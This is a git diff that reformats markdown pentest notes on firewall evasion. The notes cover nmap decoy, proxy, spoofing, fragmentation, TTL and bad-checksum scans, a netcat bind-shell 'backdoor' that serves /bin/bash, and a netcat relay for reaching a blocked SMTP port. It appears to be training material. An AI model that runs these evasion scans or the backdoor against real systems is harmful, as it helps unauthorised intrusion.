@@ -1,4 +1,6 @@
-# EVASION VIA CONTROLLING THE SOURCE MAC/IP/PORT
+# Firewall Evasion
+
+## Evasion via controlling the soource mac/ip/port
 
 ### Tool: nmap
 
@@ -18,7 +20,9 @@
 
 ### Example:
 
-#### nmap -sS -Pn -D RANDOM,RANDOM,OUR_IP -F TARGET_IP
+#### 
+
+    nmap -sS -Pn -D RANDOM,RANDOM,OUR_IP -F TARGET_IP
 
 ### TIP: You can explicitly specify the random IPs in your scan
 
@@ -26,19 +30,25 @@
 
 ### Example:
 
-#### nmap -sS -Pn --proxies PROXY_URL -F TARGET_IP
+#### 
+
+    nmap -sS -Pn --proxies PROXY_URL -F TARGET_IP
 
 ### TIP: You can chain proxies using a comma separated list
 
 ## SPOOFED MAC ADDRESS
 
-#### nmap option: --spoof-mac MAC_ADDRESS
+#### 
+
+    nmap option: --spoof-mac MAC_ADDRESS
 
 ### MAC Spoofing works only if your system is on the same network segment as the target host
 
 ## SPOOFED IP ADDRESS
 
-#### nmap option: -S IP_ADDRESS
+#### 
+
+    nmap option: -S IP_ADDRESS
 
 ### TIP: IP Spoofing can be useful if your system is on the same subnetwork as the target host. Also you can use this technique when you control a system that has a particular IP address
 
@@ -46,7 +56,9 @@
 
 ### Example:
 
-#### nmap -sS -Pn -g 8080 -F TARGET_IP
+#### 
+
+    nmap -sS -Pn -g 8080 -F TARGET_IP
 
 ### TIP: Use port number like 53,80,8080,etc
 
@@ -62,7 +74,9 @@
 
 ### -ff = 16 bytes
 
-#### nmap -sS -Pn -ff -F TARGET_IP
+#### 
+
+    nmap -sS -Pn -ff -F TARGET_IP
 
 ## Maximum Transmission Unit MTU
 
@@ -74,7 +88,9 @@
 
 ### nmap option: --data-length VALUE
 
-#### nmap -sS -Pn --data-length NUM -F TARGET_IP
+#### 
+
+    nmap -sS -Pn --data-length NUM -F TARGET_IP
 
 ### TIP: Multiple of 8
 
@@ -84,7 +100,9 @@
 
 ### option: --ttl NUM
 
-#### nmap -sS -Pn --ttl NUM -F TARGET_IP
+#### 
+
+    nmap -sS -Pn --ttl NUM -F TARGET_IP
 
 ## Set IP options
 
@@ -108,16 +126,22 @@
 
 ### option: --badsum
 
-#### nmap -sS -Pn --badsum -F TARGET_IP
+#### 
+
+    nmap -sS -Pn --badsum -F TARGET_IP
 
 # EVASION USING NON-STANDARD PORTS
 
-### Backdoor example: nc -lvnp PORT -e /bin/bash
+### Backdoor example: 
+
+    nc -lvnp PORT -e /bin/bash
 
 ### TIP: run as root to use ports below 1024 with netcat
 
 # PORT TUNNELING/PORT MAPPING/PORT FORWARDING
 
-### Example: nc -lvnp 443 -c "nc TARGET_IP 25"
+### Example: 
+
+    nc -lvnp 443 -c "nc TARGET_IP 25"
 
 #### Access the SMTP server via a port that is not blocked by the firewall
